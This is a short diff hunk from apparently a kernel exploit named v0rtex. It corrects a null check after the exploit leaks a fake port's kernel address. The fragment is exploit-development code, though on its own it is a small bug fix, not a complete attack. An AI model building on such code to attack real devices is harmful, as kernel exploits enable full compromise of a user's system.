@@ -941,7 +941,7 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
         goto out;
     }
     kptr_t fakeport_addr = UNALIGNED_KPTR_DEREF(&((kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest);
-    if(!realport_addr)
+    if(!fakeport_addr)
     {
         LOG("Failed to leak fakeport address");
         goto out;
